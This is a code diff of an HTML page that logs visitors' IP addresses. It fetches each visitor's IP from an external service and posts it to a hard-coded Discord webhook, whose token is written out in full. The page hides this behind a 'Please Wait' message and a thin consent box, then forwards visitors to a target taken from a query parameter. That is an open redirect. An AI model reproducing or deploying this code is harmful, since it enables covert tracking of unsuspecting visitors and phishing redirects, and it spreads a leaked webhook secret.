@@ -1,35 +1,106 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
-    <title>DataCollector</title>
+    <title>DataCollection</title>
+    <style>
+        #agbBox {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #111;
+            color: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 420px;
+            font-family: Arial, sans-serif;
+        }
+        button {
+            margin-top: 10px;
+            margin-right: 10px;
+            padding: 6px 12px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-    <h1>DataCollector</h1>
-    <p>Collecting Some Data about you...</p>
+    <p>Please Wait…</p>
 
-    <script>
-        // Discord Webhook URL hier einfügen
-        const webhookUrl = "https://discord.com/api/webhooks/1457050057814573146/fTL6O37dVj0UPkrHSSGC_zEOAS0ExRaO1w4EaCwaRX_MXRlYIod3f-_e_mPvn4zKlsDj";
+    <div id="agbBox" style="display:none;">
+        <b>Terms and Conditions and Privacy Policy</b>
+        <p>
+            This page processes technical data (e.g., IP address) for the purpose of providing functionality.
+        </p>
+        <button onclick="acceptAgb()">Accept</button>
+        <button onclick="declineAgb()">Deny</button>
+    </div>
 
-        // IP des Nutzers abrufen über einen externen Service
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const ip = data.ip;
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1457050057814573146/fTL6O37dVj0UPkrHSSGC_zEOAS0ExRaO1w4EaCwaRX_MXRlYIod3f-_e_mPvn4zKlsDj";
 
-                // Discord Webhook Nachricht senden
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        content: `New IP: ${ip} This IP accessed your Website!`
-                    })
-                });
-            })
-            .catch(err => console.error(err));
-    </script>
+// Zielseite
+const params = new URLSearchParams(window.location.search);
+const gotoAfter = params.get("gotoafter") || "https://t3102115-cmd.github.io";
+
+// Cookie‑Helfer
+function setCookie(name, value, days = 365) {
+    const d = new Date();
+    d.setTime(d.getTime() + days*24*60*60*1000);
+    document.cookie = `${name}=${value}; expires=${d.toUTCString()}; path=/`;
+}
+
+function getCookie(name) {
+    return document.cookie.split("; ").find(row => row.startsWith(name + "="))?.split("=")[1];
+}
+
+// Weiterleitung
+function redirect() {
+    setTimeout(() => {
+        window.location.href = gotoAfter;
+    }, 1500);
+}
+
+// IP loggen
+function logIp() {
+    fetch("https://api.ipify.org?format=json")
+        .then(r => r.json())
+        .then(data => {
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: `An visitor accesed your Website! IP: ${data.ip} GotoAfter: ${gotoAfter}`
+                })
+            });
+        })
+        .finally(redirect);
+}
+
+// AGB Aktionen
+function acceptAgb() {
+    setCookie("agb", "accepted");
+    document.getElementById("agbBox").style.display = "none";
+    logIp();
+}
+
+function declineAgb() {
+    setCookie("agb", "declined");
+    document.getElementById("agbBox").style.display = "none";
+    redirect();
+}
+
+// Startlogik
+const agbStatus = getCookie("agb");
+
+if (agbStatus === "accepted") {
+    logIp();
+} else if (agbStatus === "declined") {
+    redirect();
+} else {
+    document.getElementById("agbBox").style.display = "block";
+}
+</script>
 </body>
 </html>
